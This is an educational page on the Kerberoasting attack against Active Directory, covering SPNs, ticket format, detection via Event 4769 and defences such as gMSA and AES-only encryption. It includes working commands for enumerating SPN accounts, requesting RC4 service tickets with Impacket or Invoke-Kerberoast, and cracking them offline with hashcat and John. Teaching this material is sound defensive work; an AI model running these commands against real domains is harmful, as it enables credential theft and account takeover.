---
icon: osi
---

# 🎯Kerberoasting

### Why It Works — The Protocol Logic

Recall from the Kerberos section: the KDC issues Service Tickets to any authenticated user for any SPN, without checking whether that user has permission to use the service.

The Service Ticket is encrypted with the target service account's NT hash.

```
Attacker (valid domain user):
  "KDC, give me a Service Ticket for SPN: MSSQLSvc/db01.bank.local"

KDC (no permissions check):
  "Sure, here is a Service Ticket encrypted with
   the NT hash of the SQLService account"

Attacker:
  Takes ticket offline
  Runs Hashcat
  Cracks the password of SQLService
```

The attacker never interacted with the SQL server. Never triggered an alert on the application. Just used the authentication protocol as designed.

***

### The Conditions That Make It Powerful

```
Condition 1: No permissions check from KDC
  Any domain user can request tickets for any SPN

Condition 2: Service Tickets encrypted with service hash
  The ticket IS the hash, in crackable form

Condition 3: Service account passwords rarely rotated
  Standard user accounts: rotated every 90 days
  Service accounts: often unchanged for years, sometimes decades

Condition 4: Computer accounts are not viable targets
  Computer account passwords are 120 random characters, auto-rotating
  Service accounts tied to USER accounts may have weak passwords

Condition 5: Offline cracking — no exposure
  Once the ticket is captured, cracking happens on the attacker's
  own machine. No lockout. No network detection. No time limit.
```

***

### Understanding SPNs

A **Service Principal Name** is a unique identifier for a service instance. It is registered in AD against the account that runs the service.

Format:

```
service_class/hostname
service_class/hostname:port
service_class/hostname:port/arbitrary_name

Examples:
  MSSQLSvc/db01.bank.local:1433
  HTTP/webserver.bank.local
  HOST/fileserver.bank.local
  CIFS/shareserver.bank.local
```

When an SPN is registered against a **user account**, that account becomes a Kerberoasting target. Computer accounts are not viable targets because their passwords are uncrackable.

***

### The Attack Chain

#### Step 1 — Enumerate User Accounts with SPNs

```
PowerShell (AD Module):
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
           -Properties ServicePrincipalName |
Select-Object Name, ServicePrincipalName

PowerShell (without AD module):
setspn -Q */*

LDAP filter:
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))

Impacket:
GetUserSPNs.py bank.local/alice:Password1 -dc-ip 10.10.10.1
```

#### Step 2 — Request RC4 Service Tickets

```
Impacket (Linux):
GetUserSPNs.py bank.local/alice:Password1 -dc-ip 10.10.10.1 \
               -request -outputfile tickets.txt

PowerShell / Rubeus:
Invoke-Kerberoast -OutputFormat Hashcat | Out-File tickets.txt

Note: RC4 (encryption type 0x17) produces crackable hashes.
      AES tickets are significantly harder to crack.
      Tools request RC4 by default when supported.
```

#### Step 3 — Crack Offline

```
Hashcat (hash type 13100 = Kerberos TGS-REP):
hashcat -m 13100 tickets.txt wordlist.txt
hashcat -m 13100 tickets.txt wordlist.txt -r rules/best64.rule

John the Ripper:
john --format=krb5tgs tickets.txt --wordlist=rockyou.txt

Output:
$krb5tgs$23$*SQLService$BANK.LOCAL$MSSQLSvc/...*:Summer2019!
                                                  ───────────
                                                  cracked password
```

***

### What the Ticket Looks Like

The captured ticket in hashcat format:

```
$krb5tgs$23$*username$DOMAIN$SPN*$checksum$encrypted_data...

$23 = RC4 encryption type
     (AES would be $17 or $18 — much harder to crack)
```

***

### Detection

```
Primary indicator:
  Event ID 4769 — Kerberos service ticket requested
  TicketEncryptionType = 0x17 (RC4)
  Account is a USER account (not a machine account ending in $)

Secondary indicators:
  Single user requesting many TGS tickets rapidly
  TGS requests for services the user's role doesn't normally need
  TGS requests outside business hours

SIEM rule:
  4769 + EncryptionType = 0x17 + ServiceName != "*$"
  Threshold: > 3 events in 5 minutes from same source
```

***

### Defences

| Control                                   | Implementation                                                    | Effect                                                                           |
| ----------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| **Group Managed Service Accounts (gMSA)** | Replace user-based service accounts with gMSA                     | Passwords auto-rotate every 30 days, 120 characters — mathematically uncrackable |
| **Enforce AES-256 encryption**            | Set msDS-SupportedEncryptionTypes on service accounts to AES only | Eliminates RC4 ticket requests — AES tickets take exponentially longer to crack  |
| **SPN audit**                             | Quarterly review of user accounts with SPNs                       | Reduces attack surface — remove unused SPNs                                      |
| **Strong service account passwords**      | If gMSA not possible: 25+ random character passwords              | Dramatically increases cracking time                                             |
| **Alert on Event 4769 + 0x17**            | SIEM rule                                                         | Detects Kerberoasting in progress                                                |
| **Minimise service account privileges**   | Least privilege — service accounts should not be Domain Admins    | Limits blast radius if password is cracked                                       |

***

### Why Service Account Passwords Are Rarely Rotated

This is worth understanding — not just as a fact, but as the reason Kerberoasting is consistently effective:

```
Service accounts run application services:
  SQL Server, IIS, scheduled tasks, backup agents...

Changing a service account password requires:
  1. Changing it in AD
  2. Updating it in every application that uses it
  3. Restarting those services
  4. Verifying everything still works

In production environments:
  → The fear of breaking something is real
  → The process is manual and error-prone
  → There is no automated tooling in most environments
  → "If it's not broken, don't touch it"

Result:
  Service accounts with the same password for 5, 7, 10+ years
  Old passwords that predate modern complexity requirements
  An attacker who cracks one has a password that will
  still work long into the future
```

gMSA eliminates this problem entirely by making password rotation automatic and transparent to applications.
